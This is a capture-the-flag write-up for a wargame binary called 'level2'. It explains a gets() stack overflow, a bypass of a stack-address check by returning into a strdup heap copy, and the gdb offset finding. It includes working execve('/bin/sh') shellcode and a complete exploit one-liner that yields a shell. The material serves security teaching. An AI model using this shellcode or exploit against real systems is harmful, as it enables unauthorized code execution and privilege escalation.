# Level2 - Buffer Overflow + Heap Shellcode Injection

## Context

The program uses `gets()` to read input — a function so dangerous it was removed from the C11 standard. However, a stack address check prevents us from jumping directly to the stack, forcing us to use the **heap** instead.

---

## What is a Buffer Overflow

### How the stack works

```
[ buffer 76 bytes ]   ← gets() writes here
[ saved ebp 4 b  ]
[ return address ]    ← when ret executes, CPU jumps here
```

When `ret` executes, it reads the return address and jumps to it. If we overflow the buffer, we control where the CPU jumps.

### Why gets() is dangerous

```c
gets(buffer);    // reads until '\n' with NO size limit
                 // writes past the buffer end
                 // overwrites return address
```

---

## Attack Surface

### The stack protection

```asm
mov 0x4(%ebp),%eax       ; read return address
and $0xb0000000,%eax     ; mask high bits
cmp $0xb0000000,%eax     ; does it start with 0xb ?
jne → continue           ; no  → ok
→ exit                   ; yes → kill program !
```

Stack addresses start with `0xbffff...` — the check detects them and exits.

```
stack   → 0xbffff...  → & 0xb0000000 = 0xb0000000 → BLOCKED !
heap    → 0x0804a...  → & 0xb0000000 = 0x00000000 → ALLOWED !
```

### The solution : inject shellcode on the heap

```asm
call strdup    ; copies our buffer to the heap
               ; returns heap address in eax (0x0804a008)
ret            ; jumps to return address we control
```

`strdup` copies our input (including shellcode) to the heap at `0x0804a008` — an address that passes the check !

---

## Finding the offset

### Using ltrace

```bash
ltrace ./level2
gets(0xbffff70c ...)    ← buffer address on stack
strdup("AAAA")  = 0x0804a008   ← heap address
```
```
Starting program: /home/user/level2/level2 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
(gdb) i r
eax            0x804a008	134520840
ecx            0x0	0
edx            0xbffff6dc	-1073744164
ebx            0xb7fd0ff4	-1208152076
esp            0xbffff730	0xbffff730
ebp            0x63413563	0x63413563
esi            0x0	0
edi            0x0	0
eip            0x37634136	0x37634136
eflags         0x210282	[ SF IF RF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) 
```
Thamks to [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?), we can generate a unique pattern to find the offset. We can see that the register `EIP` is rewrite by the overflow, and its equal to `0x37634136`, so the 80th bytes of our pattern.


## Building the shellcode

No `system()` call exists in the binary, so we need to inject a shellcode that calls `execve("/bin/sh")` directly via syscall.

### 32-bit Linux shellcode

```asm
xor  eax, eax         ; eax = 0
cdq                   ; edx = 0
push eax              ; push null terminator
push 0x68732f2f       ; push "//sh"
push 0x6e69622f       ; push "/bin"
mov  ebx, esp         ; ebx = "/bin//sh"
push eax              ; push null
push ebx              ; push "/bin//sh"
mov  ecx, esp         ; ecx = argv
mov  al,  0xb         ; syscall 11 = execve
int  0x80             ; trigger syscall
```

In bytes :
```
\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
= 24 bytes
```

---

## Payload Structure

```
[ shellcode 24b ][ NOP sled 56b ][ heap address 4b ]
  execve /bin/sh   padding         0x0804a008
  ←————————————— 80 bytes ————————————→
```

### Why the NOP sled

```
\x90 = NOP instruction = "do nothing, go to next"
```

Fills the remaining bytes between shellcode and return address. If execution lands anywhere in the NOP sled, it slides into the shellcode.

```
24 (shellcode) + 56 (NOP) = 80 bytes = exact offset to return address
```

### Why the heap address

```
strdup copies our buffer → heap → 0x0804a008
ret jumps to 0x0804a008  → executes our shellcode !
0x0804a008 & 0xb0000000  = 0x00000000 → passes the check !
```

---

## Final Payload

```bash
python -c "print(
  '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
  + '\x90' * 56
  + '\x08\xa0\x04\x08'   # 0x0804a008 in little endian
)" > /tmp/exploit2

cat /tmp/exploit2 - | ./level2
```

### Payload breakdown

```
\x31\xc0...\xcd\x80  →  shellcode execve("/bin/sh") = 24 bytes
\x90 * 56            →  NOP sled to fill up to offset 80
\x08\xa0\x04\x08     →  heap address 0x0804a008 in little endian
```

---

## Full execution flow

```
1. gets()   → writes payload into stack buffer
2. check    → return address 0x0804a008 → 0x00000000 → passes !
3. strdup() → copies payload to heap at 0x0804a008
4. ret      → jumps to 0x0804a008
5. NOP sled → slides into shellcode
6. shellcode → execve("/bin/sh") → shell !
```

---

## Result

```bash
cat /tmp/exploit2 - | ./level2
whoami
level3    ← shell obtained !
```